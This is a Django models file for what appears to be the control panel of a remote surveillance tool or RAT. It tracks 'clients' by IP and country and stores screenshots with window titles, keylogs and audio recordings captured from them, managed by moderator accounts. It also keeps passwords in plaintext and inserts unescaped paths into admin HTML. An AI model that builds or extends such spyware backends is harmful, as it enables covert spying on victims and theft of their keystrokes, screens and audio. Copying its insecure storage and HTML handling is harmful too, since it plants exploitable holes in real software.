from __future__ import unicode_literals
from django.utils import timezone
from django.db import models
import pygeoip
import os

geo_ip_database = pygeoip.GeoIP('GeoIP.dat')

# Create your models here.
class Moderators(models.Model):

    def __unicode__(self):
        return self.username

    class Meta:
        verbose_name = "Moderator"

    username = models.CharField(max_length=100)
    password = models.CharField(max_length=100)
    privileges = models.IntegerField(default=0, choices=((0, 'Moderator'), (1, 'Administrator')))
    status = models.BooleanField(default=False)
    last_online = models.DateTimeField(default=timezone.now)


class Clients(models.Model):

    class Meta:
        verbose_name = "Client"

    moderator_id = models.ForeignKey(Moderators)
    identifier = models.CharField(max_length=100)
    alias = models.CharField(max_length=100, default='')
    note = models.TextField(blank=True)
    ip_address = models.CharField(max_length=100)
    country = models.CharField(default='', max_length=100)
    country_code = models.CharField(default='', max_length=100)
    last_online = models.DateTimeField(default=timezone.now)
    status = models.BooleanField(default=False)

    def __unicode__(self):
        return self.moderator_id.username

    def save(self, **kwargs):
        self.clean()
        return super(Clients, self).save(**kwargs)

    def clean(self):
        super(Clients, self).clean()
        geo_name = geo_ip_database.country_name_by_addr(self.ip_address)
        geo_code = geo_ip_database.country_code_by_addr(self.ip_address)
        self.country = geo_name if geo_name else 'UNKNOWN'
        self.country_code = geo_code if geo_code else 'UNKNOWN'


class Screenshots(models.Model):
    client_id = models.ForeignKey(Clients)
    name = models.CharField(max_length=100)
    path = models.CharField(max_length=500)
    title_name = models.CharField(max_length=1000)
    date = models.DateTimeField(default=timezone.now)
    viewed = models.BooleanField(default=False)

    def __unicode__(self):
        return self.client_id.identifier

    class Meta:
        verbose_name = "Screenshot"

    def thumbnail(self):
        return '''
        <img src="/{}" width="350">
        '''.format(self.path)
    thumbnail.allow_tags = True

    def preview(self):
        return '''
        <img src="/{}" width="680">
        '''.format(self.path)
    preview.allow_tags = True


class Keylogs(models.Model):
    client_id = models.ForeignKey(Clients)
    path = models.CharField(max_length=500)
    date = models.DateTimeField(default=timezone.now)
    viewed = models.BooleanField(default=False)


class Audios(models.Model):
    client_id = models.ForeignKey(Clients)
    path = models.CharField(max_length=500)
    date = models.DateTimeField(default=timezone.now)
    viewed = models.BooleanField(default=False)

    def waveform(self):
        return u'''
    <script src="https://cdnjs.cloudflare.com/ajax/libs/wavesurfer.js/1.2.3/wavesurfer.min.js"></script>
    <script type="text/javascript">
        function init() {{
            var wavesurfer = Object.create(WaveSurfer);
            wavesurfer.init({{
                container: document.querySelector('#{pk}'),
                waveColor: '#34495e',
                progressColor: '#2c3e50',
                height: 50,
                loop: true,
            }});
            wavesurfer.on('ready', function () {{
                wavesurfer.play();
            }});
            wavesurfer.on('finish', function () {{
                wavesurfer.play();
            }});
            wavesurfer.load('{audiopath}');
            }}
        window.onload = init;
    </script>
    <div id="{pk}" style="width:500px;"></div>
    '''.format(pk=self.pk, audiopath=self.path)

    waveform.allow_tags = True
